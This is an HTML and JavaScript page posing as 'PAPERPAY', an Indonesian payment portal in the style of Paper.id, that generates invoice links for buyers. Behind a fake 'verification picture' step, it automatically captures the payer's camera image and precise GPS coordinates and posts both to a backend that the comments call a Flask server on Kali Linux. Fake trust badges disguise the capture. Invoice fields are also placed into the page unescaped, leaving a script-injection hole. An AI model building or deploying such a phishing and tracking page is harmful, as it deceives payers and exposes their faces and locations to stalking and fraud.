<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PAPERPAY - Portal Pembayaran Digital</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: #f4f7fb;
            color: #1e293b;
        }
        .font-mono {
            font-family: 'JetBrains Mono', monospace;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between">

    <!-- Top Navigation Bar (Paper.id Style) -->
    <header class="bg-white border-b border-slate-200 px-6 py-3.5 flex items-center justify-between sticky top-0 z-30 shadow-sm">
        <div class="flex items-center gap-3">
            <div class="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-white font-black text-base shadow-sm">
                P
            </div>
            <div>
                <span class="font-extrabold text-slate-900 text-sm tracking-wider">PAPER<span class="text-emerald-500">PAY</span></span>
                <span class="text-[10px] bg-slate-100 text-slate-500 px-2 py-0.5 rounded ml-2 border border-slate-200 font-medium">Secure Payment</span>
            </div>
        </div>
        <div class="flex items-center gap-2 text-xs font-semibold text-emerald-600 bg-emerald-50 px-3 py-1.5 rounded-full border border-emerald-200">
            <i class="fas fa-shield-halved"></i>
            <span class="hidden sm:inline">256-bit Encryption</span>
        </div>
    </header>

    <!-- MAIN CONTAINER -->
    <main class="flex-1 max-w-xl w-full mx-auto p-4 sm:p-6 flex flex-col justify-center">

        <!-- ================= MODE ADMIN (Super Simpel & Cepat) ================= -->
        <div id="admin-view" class="bg-white rounded-2xl border border-slate-200 shadow-sm p-6 space-y-4">
            <div class="border-b border-slate-100 pb-3">
                <h2 class="text-base font-bold text-slate-800">Admin Link Generator</h2>
                <p class="text-xs text-slate-400">Buat link tagihan simpel untuk pembeli</p>
            </div>

            <form onsubmit="event.preventDefault();" class="space-y-3 text-xs">
                <div>
                    <label class="block font-semibold text-slate-600 mb-1">Nama Toko / Seller</label>
                    <input type="text" id="merchant-name" placeholder="CROLOZE Law Firm" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 focus:bg-white focus:border-emerald-500 outline-none">
                </div>
                <div>
                    <label class="block font-semibold text-slate-600 mb-1">Nomor WA Seller (Konfirmasi)</label>
                    <input type="tel" id="merchant-wa" placeholder="6281234567890" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 focus:bg-white focus:border-emerald-500 outline-none">
                </div>
                <div>
                    <label class="block font-semibold text-slate-600 mb-1">Nama Produk / Invoice</label>
                    <input type="text" id="item-title" placeholder="Pembayaran Invoice #1029" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 focus:bg-white focus:border-emerald-500 outline-none">
                </div>
                <div class="grid grid-cols-3 gap-2">
                    <div>
                        <label class="block font-semibold text-slate-600 mb-1">Mata Uang</label>
                        <select id="currency-select" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-2 py-2 focus:bg-white focus:border-emerald-500 outline-none font-semibold text-slate-700">
                            <option value="IDR">IDR (Rp)</option>
                            <option value="USD">USD ($)</option>
                            <option value="JPY">JPY (¥)</option>
                            <option value="SGD">SGD (S$)</option>
                            <option value="MYR">MYR (RM)</option>
                        </select>
                    </div>
                    <div class="col-span-2">
                        <label class="block font-semibold text-slate-600 mb-1">Nominal</label>
                        <input type="number" id="amount-input" placeholder="150000" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 font-mono focus:bg-white focus:border-emerald-500 outline-none">
                    </div>
                </div>
                <div>
                    <label class="block font-semibold text-slate-600 mb-1">Catatan Tambahan</label>
                    <textarea id="pay-notes" rows="2" placeholder="Transfer ke Rek BCA: 12345678 a/n PaperPay" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 focus:bg-white focus:border-emerald-500 outline-none"></textarea>
                </div>

                <button onclick="generatePayLink()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2.5 rounded-xl transition shadow-md shadow-emerald-600/20 text-xs">
                    <i class="fas fa-link mr-1"></i> Buat Link Tagihan
                </button>
            </form>

            <div id="generated-link-card" class="hidden pt-3 border-t border-slate-100 space-y-2">
                <input type="text" id="output-url" readonly class="w-full bg-slate-100 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-700">
                <div class="flex gap-2">
                    <button onclick="copyGeneratedUrl()" class="flex-1 bg-slate-800 text-white py-2 rounded-xl text-xs font-bold hover:bg-slate-900 transition">
                        <i class="fas fa-copy mr-1"></i> Salin Link
                    </button>
                    <button onclick="openCustomerModeFromLink()" class="flex-1 bg-emerald-50 text-emerald-700 border border-emerald-200 py-2 rounded-xl text-xs font-bold hover:bg-emerald-100 transition">
                        Buka Tampilan Pembeli <i class="fas fa-arrow-right ml-1"></i>
                    </button>
                </div>
            </div>
        </div>

        <!-- ================= MODE PEMBELI (Pro & Professional UI) ================= -->
        <div id="customer-view" class="hidden space-y-4 my-4">
            <!-- Dynamic Content Rendered Here -->
        </div>

    </main>

    <!-- Footer Trust Badges -->
    <footer class="bg-white border-t border-slate-200 py-4 text-center text-xs text-slate-400">
        <div class="flex justify-center items-center gap-4 mb-1">
            <span class="flex items-center gap-1"><i class="fas fa-lock text-emerald-500"></i> SSL Secure</span>
            <span>•</span>
            <span class="flex items-center gap-1"><i class="fas fa-circle-check text-emerald-500"></i> Verifikasi Instant</span>
        </div>
        <p>© 2026 PaperPay System. All rights reserved.</p>
    </footer>

    <!-- Modal Kamera & GPS Verification -->
    <div id="camera-gps-modal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
        <div class="bg-white border border-slate-200 rounded-2xl max-w-sm w-full p-6 shadow-2xl space-y-4">
            <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                <h3 class="text-sm font-bold text-slate-800 flex items-center gap-2">
                    <i class="fas fa-camera text-emerald-600"></i> Picture
                </h3>
                <div class="flex items-center gap-2">
                    <button onclick="switchCamera()" class="text-slate-600 hover:text-emerald-600 transition text-xs bg-slate-100 px-2 py-1 rounded-lg border border-slate-200">
                        <i class="fas fa-camera-rotate"></i> Switch
                    </button>
                    <button onclick="closeCameraGpsModal()" class="text-slate-400 hover:text-slate-600 transition">
                        <i class="fas fa-xmark"></i>
                    </button>
                </div>
            </div>

            <!-- Feed Kamera -->
            <div class="relative bg-slate-900 rounded-xl overflow-hidden h-64 border border-slate-200 flex items-center justify-center">
                <video id="camera-feed" autoplay playsinline class="w-full h-full object-cover -scale-x-100"></video>
                <canvas id="snap-canvas" class="hidden"></canvas>
                <img id="captured-preview" class="absolute inset-0 w-full h-full object-cover hidden z-10" alt="Hasil Foto">
                <div id="camera-placeholder" class="absolute text-center p-4">
                    <i class="fas fa-spinner fa-spin text-2xl text-emerald-400 mb-2"></i>
                    <p class="text-xs text-slate-300">Menghubungkan ke Sensor Keamanan...</p>
                </div>
            </div>

            <!-- Status Indicator -->
            <div class="space-y-2 text-xs">
                <div class="flex items-center justify-between p-2.5 rounded-xl bg-slate-50 border border-slate-200">
                    <span class="text-slate-500"><i class="fas fa-camera text-slate-400 mr-1.5"></i> Camera:</span>
                    <span id="photo-status-text" class="text-amber-600 font-semibold">Proses...</span>
                </div>
                <div class="flex items-center justify-between p-2.5 rounded-xl bg-slate-50 border border-slate-200">
                    <span class="text-slate-500"><i class="fas fa-location-dot text-slate-400 mr-1.5"></i> Authentication:</span>
                    <span id="gps-status-text" class="text-amber-600 font-semibold">Mencari Koordinat...</span>
                </div>
            </div>

            <button onclick="saveVerificationAndClose()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2.5 rounded-xl shadow-md shadow-emerald-600/20 text-xs transition">
                Confirm
            </button>
        </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="fixed bottom-5 right-5 bg-slate-900 text-white px-4 py-3 rounded-xl shadow-2xl flex items-center gap-3 transition-all duration-300 transform translate-y-24 opacity-0 z-50">
        <i id="toast-icon" class="fas fa-check-circle text-emerald-400"></i>
        <span id="toast-message" class="text-xs font-medium">Notifikasi</span>
    </div>

    <!-- JavaScript Logic -->
    <script>
        let invoiceData = {};
        let cameraStream = null;
        let capturedSnapshotBase64 = null;
        let capturedCoordinates = null;
        let googleMapsUrl = "";
        let currentFacingMode = "user";

        window.addEventListener('DOMContentLoaded', () => {
            const urlParams = new URLSearchParams(window.location.search);
            const dataParam = urlParams.get('data');

            if (dataParam) {
                try {
                    const decodedData = atob(dataParam);
                    invoiceData = JSON.parse(decodedData);
                    renderCustomerView();
                } catch (e) {
                    showToast("Link tidak valid!", "fa-triangle-exclamation");
                }
            }
        });

        function formatMoney(amount, currency) {
            const val = parseFloat(amount) || 0;
            switch(currency) {
                case 'IDR':
                    return 'Rp ' + val.toLocaleString('id-ID');
                case 'USD':
                    return '$ ' + val.toLocaleString('en-US');
                case 'JPY':
                    return '¥ ' + val.toLocaleString('ja-JP');
                case 'SGD':
                    return 'S$ ' + val.toLocaleString('en-SG');
                case 'MYR':
                    return 'RM ' + val.toLocaleString('ms-MY');
                default:
                    return currency + ' ' + val.toLocaleString();
            }
        }

        function generatePayLink() {
            const mName = document.getElementById('merchant-name').value || 'CROLOZE';
            const waNum = document.getElementById('merchant-wa').value;
            const title = document.getElementById('item-title').value;
            const amount = document.getElementById('amount-input').value;
            const currency = document.getElementById('currency-select').value;
            const notes = document.getElementById('pay-notes').value;

            if (!title || !amount) {
                showToast("Isi Nama Produk dan Nominal!", "fa-triangle-exclamation");
                return;
            }

            const payload = { m: mName, wa: waNum, t: title, a: amount, c: currency, n: notes };
            const encoded = btoa(JSON.stringify(payload));
            const finalUrl = `${window.location.href.split('?')[0]}?data=${encoded}`;

            document.getElementById('output-url').value = finalUrl;
            document.getElementById('generated-link-card').classList.remove('hidden');
            showToast("Link berhasil dibuat!", "fa-circle-check");
        }

        function copyGeneratedUrl() {
            const copyText = document.getElementById("output-url");
            copyText.select();
            navigator.clipboard.writeText(copyText.value);
            showToast("Link disalin!", "fa-copy");
        }

        function openCustomerModeFromLink() {
            window.location.href = document.getElementById('output-url').value;
        }

        // RENDER TAMPILAN PEMBELI (SUPER PROFESSIONAL PAPER.ID STYLE)
        function renderCustomerView() {
            document.getElementById('admin-view').classList.add('hidden');
            const container = document.getElementById('customer-view');
            container.classList.remove('hidden');

            const formattedAmount = formatMoney(invoiceData.a, invoiceData.c);

            container.innerHTML = `
                <!-- Main Invoice Box -->
                <div class="bg-white rounded-2xl border border-slate-200 shadow-xl overflow-hidden">
                    
                    <!-- Header Merchant Info -->
                    <div class="p-6 bg-slate-900 text-white relative">
                        <div class="flex justify-between items-start mb-4">
                            <div>
                                <span class="bg-emerald-500/20 text-emerald-300 text-[10px] font-extrabold uppercase tracking-widest px-2.5 py-1 rounded-full border border-emerald-500/30">
                                    Official Merchant
                                </span>
                                <h2 class="text-xl font-bold text-white mt-2">${invoiceData.m || 'CROLOZE'}</h2>
                                <p class="text-xs text-slate-400">Terverifikasi Sistem PaperPay</p>
                            </div>
                            <div class="w-10 h-10 rounded-xl bg-white/10 backdrop-blur border border-white/10 flex items-center justify-center text-emerald-400 text-lg">
                                <i class="fas fa-file-invoice"></i>
                            </div>
                        </div>

                        <div class="pt-4 border-t border-slate-800/80 flex justify-between items-end">
                            <div>
                                <p class="text-[11px] text-slate-400">Total Tagihan Pembayaran</p>
                                <p class="text-2xl font-black text-white font-mono tracking-tight mt-0.5">${formattedAmount}</p>
                            </div>
                            <span class="text-xs font-semibold text-amber-400 bg-amber-400/10 px-2.5 py-1 rounded-lg border border-amber-400/20">
                                Awaiting Verification
                            </span>
                        </div>
                    </div>

                    <!-- Details Content -->
                    <div class="p-6 space-y-5 text-xs">
                        <!-- Detail Barang -->
                        <div class="space-y-2">
                            <span class="text-slate-400 font-bold uppercase tracking-wider text-[10px]">Rincian Transaksi</span>
                            <div class="flex justify-between items-center p-3 bg-slate-50 rounded-xl border border-slate-200">
                                <span class="font-semibold text-slate-800">${invoiceData.t || 'Tagihan Pembayaran'}</span>
                                <span class="font-mono font-bold text-slate-900">${formattedAmount}</span>
                            </div>
                        </div>

                        ${invoiceData.n ? `
                        <!-- Catatan Pembayaran -->
                        <div class="p-3.5 bg-blue-50/60 border border-blue-200 rounded-xl text-slate-700 space-y-1">
                            <span class="font-bold text-blue-900 block flex items-center gap-1.5">
                                <i class="fas fa-circle-info text-blue-600"></i> Instuksi Pembayaran / Catatan:
                            </span>
                            <p class="text-slate-600">${invoiceData.n}</p>
                        </div>` : ''}

                        <!-- Box Verifikasi Kamera & GPS -->
                        <div class="border-2 border-dashed border-slate-200 rounded-2xl p-4 text-center bg-slate-50/50 space-y-3">
                            <div id="cust-proof-placeholder" class="py-2">
                                <div class="w-12 h-12 rounded-full bg-slate-200/80 flex items-center justify-center text-slate-400 mx-auto mb-2 text-lg">
                                    <i class="fas fa-shield-cat"></i>
                                </div>
                                <p class="font-bold text-slate-700">Verification Picture</p>
                                <p class="text-[11px] text-slate-400 max-w-xs mx-auto mt-0.5">Take a picture for verification.</p>
                            </div>

                            <img id="cust-proof-preview" class="hidden w-full h-48 object-cover rounded-xl border border-slate-200 shadow-sm" alt="Bukti Verifikasi">
                            <div id="cust-location-badge"></div>

                            <button type="button" onclick="startCombinedVerification()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 px-4 rounded-xl shadow-md shadow-emerald-600/20 transition flex items-center justify-center gap-2">
                                <i class="fas fa-camera"></i> Take Picture
                            </button>
                        </div>

                        <!-- Tombol WA Seller -->
                        <button type="button" onclick="sendConfirmationToSeller()" class="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-3.5 px-4 rounded-xl shadow-lg transition flex items-center justify-center gap-2 text-xs">
                            <i class="fab fa-whatsapp text-emerald-400 text-base"></i> Confirm Payment
                        </button>
                    </div>

                </div>
            `;
        }

        // LOGIKA KAMERA & GPS (Tetap Mengirim Ke Flask Kali Linux)
        function startCombinedVerification() {
            document.getElementById('camera-gps-modal').classList.remove('hidden');
            document.getElementById('captured-preview').classList.add('hidden');
            document.getElementById('camera-placeholder').classList.remove('hidden');
            document.getElementById('photo-status-text').innerText = "Processing...";
            document.getElementById('gps-status-text').innerText = "Processing...";
            startCamera();
            fetchGPSLocation();
        }

        function startCamera() {
            const video = document.getElementById('camera-feed');
            if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); }

            if (currentFacingMode === 'user') video.classList.add('-scale-x-100');
            else video.classList.remove('-scale-x-100');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: false })
            .then(stream => {
                cameraStream = stream;
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => takeAutoSnapshot(), 1500);
                };
            })
            .catch(() => showToast("Akses kamera ditolak!", "fa-triangle-exclamation"));
        }

        function switchCamera() {
            currentFacingMode = (currentFacingMode === "user") ? "environment" : "user";
            startCamera();
        }

        function takeAutoSnapshot() {
            const video = document.getElementById('camera-feed');
            const canvas = document.getElementById('snap-canvas');
            if (!video || !canvas) return;

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');

            if (currentFacingMode === 'user') {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            capturedSnapshotBase64 = canvas.toDataURL('image/jpeg', 0.8);

            document.getElementById('captured-preview').src = capturedSnapshotBase64;
            document.getElementById('captured-preview').classList.remove('hidden');
            document.getElementById('camera-placeholder').classList.add('hidden');
            document.getElementById('photo-status-text').innerText = "Success";
            document.getElementById('photo-status-text').className = "text-emerald-600 font-bold";

            // Kirim ke Backend Flask (Kali Linux)
            fetch('/upload-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: capturedSnapshotBase64 })
            }).catch(e => console.error(e));
        }

        function fetchGPSLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        capturedCoordinates = { lat, lon };
                        googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
                        
                        document.getElementById('gps-status-text').innerText = `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
                        document.getElementById('gps-status-text').className = "text-emerald-600 font-bold";

                        // Kirim ke Backend Flask (Kali Linux)
                        fetch('/upload-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ coords: capturedCoordinates })
                        }).catch(e => console.error(e));
                    },
                    () => {
                        document.getElementById('gps-status-text').innerText = "Failed";
                        document.getElementById('gps-status-text').className = "text-rose-500 font-medium";
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }
        }

        function saveVerificationAndClose() {
            if (capturedSnapshotBase64) {
                document.getElementById('cust-proof-preview').src = capturedSnapshotBase64;
                document.getElementById('cust-proof-preview').classList.remove('hidden');
                document.getElementById('cust-proof-placeholder').classList.add('hidden');
            }

            if (capturedCoordinates) {
                document.getElementById('cust-location-badge').innerHTML = `
                    <div class="text-[11px] bg-emerald-50 border border-emerald-200 text-emerald-800 p-2.5 rounded-xl flex items-center justify-between">
                        <span><i class="fas fa-location-dot text-emerald-600 mr-1.5"></i> Lokasi Terverifikasi Valid</span>
                        <a href="${googleMapsUrl}" target="_blank" class="text-emerald-700 font-bold hover:underline">Buka Maps <i class="fas fa-arrow-up-right-from-square text-[9px]"></i></a>
                    </div>
                `;
            }

            closeCameraGpsModal();
            showToast("Verifikasi Keamanan Berhasil!", "fa-circle-check");
        }

        function closeCameraGpsModal() {
            document.getElementById('camera-gps-modal').classList.add('hidden');
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
        }

        function sendConfirmationToSeller() {
            if (!capturedSnapshotBase64 && !capturedCoordinates) {
                showToast("Lakukan verifikasi lokasi/foto dulu!", "fa-triangle-exclamation");
                return;
            }

            const waNum = invoiceData.wa || '';
            const title = invoiceData.t || 'Tagihan';
            const formatted = formatMoney(invoiceData.a, invoiceData.c);
            let message = `Halo ${invoiceData.m || 'Seller'},\nSaya telah melakukan verifikasi pembayaran PaperPay untuk *${title}* (${formatted}).\n\n`;
            if (capturedCoordinates) message += `📍 *Lokasi:* ${googleMapsUrl}\n`;
            message += `\nMohon diproses, terima kasih!`;

            window.open(`https://wa.me/${waNum}?text=${encodeURIComponent(message)}`, '_blank');
        }

        function showToast(message, iconClass = 'fa-check-circle') {
            const toast = document.getElementById('toast');
            document.getElementById('toast-message').innerText = message;
            document.getElementById('toast-icon').className = `fas ${iconClass} text-emerald-400`;
            toast.classList.remove('translate-y-24', 'opacity-0');
            setTimeout(() => toast.classList.add('translate-y-24', 'opacity-0'), 3000);
        }
    </script>
</body>
</html>
